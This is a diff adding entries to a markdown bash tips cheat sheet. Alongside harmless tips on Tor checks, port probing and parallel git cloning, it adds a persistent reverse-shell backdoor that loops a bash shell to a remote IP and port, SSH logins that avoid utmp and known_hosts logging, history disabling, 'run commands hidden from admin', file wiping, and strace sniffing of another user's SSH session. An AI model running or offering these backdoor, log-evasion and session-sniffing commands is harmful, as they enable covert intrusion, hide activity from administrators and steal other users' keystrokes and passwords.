@@ -42,6 +42,117 @@ And then:
 parallel -j${NUMCPUSPLUSONE} -n${NUMTHREADS} ....
 ```
 
+### Try Tor connection
+```sh
+curl --socks5 localhost:9050 \
+     --socks5-hostname localhost:9050 \
+     https://check.torproject.org/api/ip
+```
+
+### Create a backdoor for reverse shell
+
+```sh
+#!/bin/bash
+
+IP=ip
+PORT=port
+
+nohup bash -c ' \
+while :;do
+   setsid bash -i &>/dev/tcp/$IP/$PORT 0>&1; 
+   sleep 3600; 
+done' &>/dev/null &
+
+fuser /dev/shm/.busy &>/dev/null
+if [ $? -eq 1 ]; then
+nohup /bin/bash -c ' \
+while :; do 
+	touch /dev/shm/.busy;
+	exec 3</dev/shm/.busy; 
+	setsid bash -i &>/dev/tcp/$IP/$PORT ; 
+	sleep 3600; 
+done' &>/dev/null &
+fi
+```
+
+
+###  Almost invisible SSH
+
+Author [hackerschoice](https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet#lbwh-anchor)
+
+This will not add your user to the /var/log/utmp file and you 
+won't show up in w or who command of logged in users. 
+It will bypass .profile and .bash_profile as well. 
+On your client side it will stop logging the host name to ~/.ssh/known_hosts.
+
+```sh
+ssh -o UserKnownHostsFile=/dev/null -T user@server.org "bash -i"
+```
+
+### Leave bash without History
+
+Tell Bash to use `/dev/null` instead of `~/.bash_history` 
+This is the first command we execute on every shell. 
+It will stop the Bash from logging your commands.
+
+```sh
+export HISTFILE=/dev/null
+```
+
+### Run commmands hidden from admin
+
+```sh
+/bin/bash -c "exec ls"
+```
+
+### Bash Suicode
+
+```sh
+kill -9  $$
+Warning: Program '/bin/bash' crashed.
+```
+
+### Shred and Wipe without Shred
+
+```sh
+FN=textfile.txt;
+dd bs=1k count="`du -sk \"${FN}\"|cut -f1`" if=/dev/urandom >"${FN}"; 
+rm -f "${FN}"
+```
+
+### Sniff a user's SSH session with strace
+```sh
+strace -e trace=read -p <PID> 2>&1 \
+	|while read x; do echo "$x" \
+	|grep '^read.*= [1-9]$' \
+	|cut -f2 -d\"; 
+done
+```
+
+### Check if a port is open or closed in pure Bash
+
+```sh
+ ( echo > /dev/tcp/nr1.nu/81; ) &> /dev/null 1>&2 | \
+ if [[ $? = "0" ]]; then echo "up"; else echo "down"; fi
+```
+
+OR 
+
+```sh
+( : <> /dev/tcp/nr1.nu/81;) \
+    &> /dev/null 1>&2 \
+    && echo "up" \
+    || echo "closed"
+```
+
+### Browse to `https://www.nr1.nu` in pure Bash
+
+```sh
+exec 5<>/dev/tcp/www.nr1.nu/443
+echo -e "GET / HTTP/1.0\n" >&5
+cat <&5
+```
+
 ### Run last command again
 
 ```sh
@@ -56,7 +167,17 @@ fc -1 -20
 
 ### Clone starred github repos in parallel with unlimited speed, clone `20` repos in `parallel`.
 
+* xargs
+```sh
+GITUSER=$(whoami); 
+curl "https://api.github.com/users/${GITUSER}/starred?per_page=1000" \
+    |grep -o 'git@[^"]*' \
+    |xargs -n -P20 -L1 git clone
+```
+
 [Also shared here](https://www.commandlinefu.com/commands/view/26591/clone-starred-github-repos-in-parallel-with-unlimited-speed-this-example-will-clone-25-repositories-in-parallel-at-same-time.)
+
+* Parallel 
 
 ```sh
 GITUSER=$(whoami); 
@@ -65,10 +186,9 @@ curl "https://api.github.com/users/${GITUSER}/starred?per_page=1000" \
     |parallel -j 25 'git clone {}'
 ```
 
-
 ### Really fast portscanner with colorized output:
 
-65535 ports scanned in ~3.5s 
+`65535` ports scanned in ~`3.5`s 
 
 ![portscan](https://user-images.githubusercontent.com/26827453/177014274-d1fda5b4-83a5-4a7b-9bfe-17784ffb5ee7.gif)
 
